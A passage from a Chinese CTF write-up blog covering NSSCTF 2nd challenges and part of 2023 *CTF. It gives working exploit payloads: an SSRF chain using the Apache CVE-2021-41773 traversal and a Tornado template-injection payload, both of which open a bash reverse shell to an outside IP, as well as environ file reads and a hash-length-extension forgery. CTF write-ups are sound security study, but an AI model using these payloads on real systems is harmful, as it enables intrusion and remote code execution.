/flag HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:80</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;mybox://127.0.0.1:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br><span class="hljs-comment">#注意两次url编码</span><br><span class="hljs-built_in">print</span>(urllib.parse.quote(result))<br></code></pre></td></tr></table></figure><p>以为flag在当前目录，回显404，但是这里有一个关键，Apache版本为2.4.49，以前复现过的CVE-2021-41773，可以目录穿越</p><figure><img src="/img/NSSCTF%202nd/17006210686831.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>CVE-2021-41773的payload:<code>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> urllib.parse<br>test =<span class="hljs-string">&quot;&quot;&quot;GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1:80</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 51</span><br><span class="hljs-string"></span><br><span class="hljs-string">bash -c &quot;bash -i &amp;&gt; /dev/tcp/1.12.251.62/4567 0&gt;&amp;1&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;mybox://127.0.0.1:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br><span class="hljs-built_in">print</span>(urllib.parse.quote(result))<br><span class="hljs-comment">#mybox%3A//127.0.0.1%3A80/_GET%2520/cgi-bin/.%25252e/.%25252e/.%25252e/.%25252e/.%25252e/bin/sh%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252051%250D%250A%250D%250Abash%2520-c%2520%2522bash%2520-i%2520%2526%253E%2520/dev/tcp/1.12.251.62/4567%25200%253E%25261%2522%250D%250A</span><br></code></pre></td></tr></table></figure><figure><img src="/img/NSSCTF%202nd/17006210686832.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Python">daemon@d22eb7fdd4144138:/<span class="hljs-built_in">bin</span>$ cat /nevvvvvver_f1nd_m3_the_t3ue_flag<br><br>NSSCTF&#123;dfaa40bc-dab6-433a-a970-ec0e3b5ba084&#125;<br></code></pre></td></tr></table></figure><h2 id="myhurricane">MyHurricane</h2><p>参考https://blog.csdn.net/miuzzx/article/details/123329244</p><p>开局源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> tornado.ioloop<br><span class="hljs-keyword">import</span> tornado.web<br><span class="hljs-keyword">import</span> os<br><br>BASE_DIR = os.path.dirname(__file__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">data</span>):<br>    bl = [<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;__&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;or&#x27;</span>, <span class="hljs-string">&#x27;and&#x27;</span>, <span class="hljs-string">&#x27;not&#x27;</span>, <span class="hljs-string">&#x27;&#123;&#123;&#x27;</span>, <span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>]<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> bl:<br>        <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> data:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> chunk <span class="hljs-keyword">in</span> data.split():<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> chunk:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-number">31</span> &lt; <span class="hljs-built_in">ord</span>(c) &lt; <span class="hljs-number">128</span>):<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexHandler</span>(tornado.web.RequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(__file__, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            self.finish(f.read())<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">post</span>(<span class="hljs-params">self</span>):<br>        data = self.get_argument(<span class="hljs-string">&quot;ssti&quot;</span>)<br>        <span class="hljs-keyword">if</span> waf(data):<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.html&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(<span class="hljs-string">f&quot;&quot;&quot;&lt;html&gt;</span><br><span class="hljs-string">                        &lt;head&gt;&lt;/head&gt;</span><br><span class="hljs-string">                        &lt;body style=&quot;font-size: 30px;&quot;&gt;<span class="hljs-subst">&#123;data&#125;</span>&lt;/body&gt;&lt;/html&gt;</span><br><span class="hljs-string">                        &quot;&quot;&quot;</span>)<br>                f.flush()<br>            self.render(<span class="hljs-string">&#x27;1.html&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            self.finish(<span class="hljs-string">&#x27;no no no&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app = tornado.web.Application([<br>            (<span class="hljs-string">r&quot;/&quot;</span>, IndexHandler),<br>        ], compiled_template_cache=<span class="hljs-literal">False</span>)<br>    app.listen(<span class="hljs-number">827</span>)<br>    tornado.ioloop.IOLoop.current().start()<br></code></pre></td></tr></table></figure><p>tornadossti，过滤了<code>['\'', '"', '__', '(', ')', 'or', 'and', 'not', '&#123;&#123;', '&#125;&#125;']</code></p><p>过滤了<code>&#123;&#123;&#125;&#125;</code>用<code>&#123;%%&#125;</code>代替</p><p>过滤了and和or其实就是不能用<code>handler</code>和<code>import</code></p><p>这里利用了<code>_tt_utf8</code>进行变量覆盖，<code>set _tt_utf8=eval</code></p><p>原理</p><figure><img src="/img/NSSCTF%202nd/17006210686833.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>过滤了单引号和双引号，可能要加另一个变量替换（即<spanclass="math inline">\(a(\)</span>b)&amp;$b=""），这里利用<code>request.body_arguments[request.method]</code>，返回的变量名为<code>GET</code>、<code>POST</code>...</p><p>最后payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python">ssti=&#123;% raw request.body_arguments[request.method][<span class="hljs-number">0</span>]%0a    _tt_utf8 = <span class="hljs-built_in">eval</span>%&#125;&amp;POST=<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;%26 /dev/tcp/1.12.251.62/4567 &lt;%261&#x27;&quot;</span>)<br>ssti=&#123;% <span class="hljs-built_in">set</span> _tt_utf8 =<span class="hljs-built_in">eval</span> %&#125;&#123;% raw request.body_arguments[request.method][<span class="hljs-number">0</span>] %&#125;&amp;POST=<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&quot;bash -c &#x27;bash -i &gt;%26 /dev/tcp/1.12.251.62/4567 0&lt;%261&#x27;&quot;</span>)<br><br><span class="hljs-comment">#非预期</span><br>ssti=&#123;% include /proc/<span class="hljs-number">1</span>/environ %&#125;<br></code></pre></td></tr></table></figure><figure><img src="/img/NSSCTF%202nd/17006210686844.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/NSSCTF%202nd/17006210686845.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>flag在env中</p><h1 id="misc">MISC</h1><h2 id="gift_in_qrcoderevenge">gift_in_qrcode(revenge)</h2><p>给了源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> qrcode<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randrange, getrandbits, seed<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> base64<br><br>flag = os.getenv(<span class="hljs-string">&quot;FLAG&quot;</span>)<br><span class="hljs-keyword">if</span> flag == <span class="hljs-literal">None</span>:<br>    flag = <span class="hljs-string">&quot;flag&#123;test&#125;&quot;</span><br><br>secret_seed = randrange(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>)<br>seed(secret_seed)<br>reveal = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    reveal.append(<span class="hljs-built_in">str</span>(getrandbits(<span class="hljs-number">8</span>)))<br>target = getrandbits(<span class="hljs-number">8</span>)<br>reveal = <span class="hljs-string">&quot;,&quot;</span>.join(reveal)<br><br>img_qrcode = qrcode.make(reveal)<br>img_qrcode = img_qrcode.crop((<span class="hljs-number">35</span>, <span class="hljs-number">35</span>, img_qrcode.size[<span class="hljs-number">0</span>] - <span class="hljs-number">35</span>, img_qrcode.size[<span class="hljs-number">1</span>] - <span class="hljs-number">35</span>))<br><br>offset, delta, rate = <span class="hljs-number">50</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span><br>img_qrcode = img_qrcode.resize(<br>    (<span class="hljs-built_in">int</span>(img_qrcode.size[<span class="hljs-number">0</span>] / rate), <span class="hljs-built_in">int</span>(img_qrcode.size[<span class="hljs-number">1</span>] / rate)), Image.LANCZOS<br>)<br>img_out = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, img_qrcode.size)<br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img_qrcode.size[<span class="hljs-number">1</span>]):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img_qrcode.size[<span class="hljs-number">0</span>]):<br>        pixel_qrcode = img_qrcode.getpixel((x, y))<br>        <span class="hljs-keyword">if</span> pixel_qrcode == <span class="hljs-number">255</span>:<br>            img_out.putpixel(<br>                (x, y),<br>                (<br>                    randrange(offset, offset + delta),<br>                    randrange(offset, offset + delta),<br>                    randrange(offset, offset + delta),<br>                ),<br>            )<br>        <span class="hljs-keyword">else</span>:<br>            img_out.putpixel(<br>                (x, y),<br>                (<br>                    randrange(offset - delta, offset),<br>                    randrange(offset - delta, offset),<br>                    randrange(offset - delta, offset),<br>                ),<br>            )<br><br>img_out.save(<span class="hljs-string">&quot;qrcode.png&quot;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;qrcode.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This my gift:&quot;</span>)<br><span class="hljs-built_in">print</span>(base64.b64encode(data).decode(), <span class="hljs-string">&quot;\n&quot;</span>)<br><br>ans = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;What&#x27;s your answer:&quot;</span>)<br><span class="hljs-keyword">if</span> ans == <span class="hljs-built_in">str</span>(target):<br>    <span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No no no!&quot;</span>)<br></code></pre></td></tr></table></figure><p>题目大致思路：server端给出一个经过像素扰动的qrcode（范围<code>offset, delta, rate = 50, 3, 5</code>）的base64码，这个qrcode扫出来是一个有20个数字的数组，这些数字是由seed随机产生的，服务端接收1个数字，如果这个数字是qrcode里的数组中的第21个，则输出flag</p><p>思路不是很难，因为<code>secret_seed = randrange(1, 1000)</code>，产生随机数的seed给了范围，所以可以爆破第21个数字。主要难点在于像素扰动扫码以及爆破数字</p><p>学习一下wp，使用np.where还原，pyzbar识别二维码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> cv2<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">from</span> pyzbar <span class="hljs-keyword">import</span> pyzbar<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> getrandbits, seed<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getTarget</span>(<span class="hljs-params">rec</span>):<br>    <span class="hljs-comment"># 1.读取二维码</span><br>    img_bytes = base64.b64decode(rec)<br>    img_array = np.frombuffer(img_bytes, np.uint8)<br>    img = cv2.imdecode(img_array, cv2.IMREAD_GRAYSCALE)<br><br>    <span class="hljs-comment"># 2.还原二维码</span><br>    img = np.where(img &lt; <span class="hljs-number">50</span>, <span class="hljs-number">0</span>, <span class="hljs-number">255</span>)<br>    <span class="hljs-comment"># cv2.imshow(&quot;img&quot;, img.astype(np.uint8))</span><br><br>    <span class="hljs-comment"># 3.扫描二维码解析</span><br>    lis = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, pyzbar.decode(img)[<span class="hljs-number">0</span>].data.decode().split(<span class="hljs-string">&quot;,&quot;</span>)))<br>    <span class="hljs-built_in">print</span>(lis)<br><br>    <span class="hljs-comment"># 4.爆破Target</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1000</span>):<br>        seed(i)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">all</span>(getrandbits(<span class="hljs-number">8</span>) == lis[j] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>)):<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(getrandbits(<span class="hljs-number">8</span>))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    rec = <span class="hljs-string">b&#x27;&#x27;</span><br>    target = getTarget(rec)<br>    <span class="hljs-built_in">print</span>(target)<br><span class="hljs-comment">#[227, 19, 102, 10, 150, 150, 220, 227, 58, 162, 132, 38, 149, 137, 242, 205, 8, 7, 17, 200]</span><br><span class="hljs-comment">#81</span><br></code></pre></td></tr></table></figure><figure><img src="/img/NSSCTF%202nd/17006210686846.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="magic-docker">Magic Docker</h2><p><code>docker run randark/nssctf-round15-magic-docker</code></p><p>pull下来后提示need secret</p><figure><img src="/img/NSSCTF%202nd/17006210686847.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>bash进入就行</p><figure><img src="/img/NSSCTF%202nd/17006210686848.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>/app下有main.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> click<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br><span class="hljs-meta">@click.command()</span><br><span class="hljs-meta">@click.option(<span class="hljs-params"><span class="hljs-string">&#x27;--secret&#x27;</span>,<span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;default=none,between 0 and 100&#x27;</span>,<span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>(<span class="hljs-params">secret</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(secret)==<span class="hljs-built_in">str</span>(answer):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Congratulations!&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;But where is your flag?  (=‵ω′=)&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No! You don&#x27;t know anything about docker!&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;How dare you! &quot;</span>)<br><br>BANNER=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">███╗   ██╗███████╗███████╗ ██████╗████████╗███████╗    ██████╗ ███╗   ██╗██████╗            </span><br><span class="hljs-string">████╗  ██║██╔════╝██╔════╝██╔════╝╚══██╔══╝██╔════╝    ╚════██╗████╗  ██║██╔══██╗           </span><br><span class="hljs-string">██╔██╗ ██║███████╗███████╗██║        ██║   █████╗       █████╔╝██╔██╗ ██║██║  ██║           </span><br><span class="hljs-string">██║╚██╗██║╚════██║╚════██║██║        ██║   ██╔══╝      ██╔═══╝ ██║╚██╗██║██║  ██║           </span><br><span class="hljs-string">██║ ╚████║███████║███████║╚██████╗   ██║   ██║         ███████╗██║ ╚████║██████╔╝           </span><br><span class="hljs-string">╚═╝  ╚═══╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝         ╚══════╝╚═╝  ╚═══╝╚═════╝            </span><br><span class="hljs-string">                                                                                            </span><br><span class="hljs-string">███╗   ███╗ █████╗  ██████╗ ██╗ ██████╗    ██████╗  ██████╗  ██████╗██╗  ██╗███████╗██████╗ </span><br><span class="hljs-string">████╗ ████║██╔══██╗██╔════╝ ██║██╔════╝    ██╔══██╗██╔═══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗</span><br><span class="hljs-string">██╔████╔██║███████║██║  ███╗██║██║         ██║  ██║██║   ██║██║     █████╔╝ █████╗  ██████╔╝</span><br><span class="hljs-string">██║╚██╔╝██║██╔══██║██║   ██║██║██║         ██║  ██║██║   ██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗</span><br><span class="hljs-string">██║ ╚═╝ ██║██║  ██║╚██████╔╝██║╚██████╗    ██████╔╝╚██████╔╝╚██████╗██║  ██╗███████╗██║  ██║</span><br><span class="hljs-string">╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚═════╝    ╚═════╝  ╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝</span><br><span class="hljs-string">                                                                                            </span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    os.system(<span class="hljs-string">&quot;rm -f /flag&quot;</span>)<br>    <span class="hljs-built_in">print</span>(BANNER)<br>    random.seed(<span class="hljs-string">&quot;NSSCTF 2nd&quot;</span>)<br>    answer=random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">100</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)&lt;<span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;You need to give me the secret!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        func()<br></code></pre></td></tr></table></figure><p>可以看到启动docker后就会删掉flag，但是这前面func好像没什么用</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023*CTF</title>
    <link href="/2023/08/27/2023starCTF/"/>
    <url>/2023/08/27/2023starCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="ctf">2023*CTF</h1><h2 id="web"><strong>web</strong></h2><h3 id="jwt2struts"><strong>jwt2struts</strong></h3><p>源码里提示访问<code>JWT_key.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./secret_key.php&quot;</span>;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;./salt.php&quot;</span>;<br><span class="hljs-comment">//$salt = XXXXXXXXXXXXXX // the salt include 14 characters</span><br><span class="hljs-comment">//md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df</span><br>@<span class="hljs-variable">$username</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;username&quot;</span>]);<br>@<span class="hljs-variable">$password</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;password&quot;</span>]);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;digest&quot;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$username</span> === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-variable">$password</span> != <span class="hljs-string">&quot;root&quot;</span>) &#123;<br>         <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;digest&quot;</span>] === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$salt</span>.<span class="hljs-variable">$username</span>.<span class="hljs-variable">$password</span>)) &#123;<br>            <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;The secret_key is &quot;</span>. <span class="hljs-variable">$secret_key</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;Your cookies don&#x27;t match up! STOP HACKING THIS SITE.&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;no no no&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>刚开始在想怎么爆破没想到绕过，后面发现是哈希扩展长度攻击绕过md5，参考：https://blog.csdn.net/LYJ20010728/article/details/116779357</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hashpump</span> -s e6ccbf12de9d33ec27a5bcfb6a3293df -d adminroot -k <span class="hljs-number">14</span> -a ddd<br></code></pre></td></tr></table></figure><p>得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Plain">Cookie: digest=9e2b0620d7214919beaea5998acdb7fd<br><br>username=%61%64%6d%69%6e&amp;password=root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%b8%00%00%00%00%00%00%00ddd<br></code></pre></td></tr></table></figure><figure><img src="/img/2023starCTF/16969546245907.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>得到key：sk-he001ctf3r</p><p>jwt.io伪造token：<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MjAwNjIxNDE3N30.eoaKqDM23OT-iEZBhva5Yc-GKN876B9f-cbkqaQodgM</code></p><figure><img src="/img/2023starCTF/16969546245871.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023starCTF/16969546245882.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>strust2一把梭</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /proc/self/environ<br></code></pre></td></tr></table></figure><figure><img src="/img/2023starCTF/16969546245883.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023starCTF/16969546245884.png" alt="img" /><figcaption 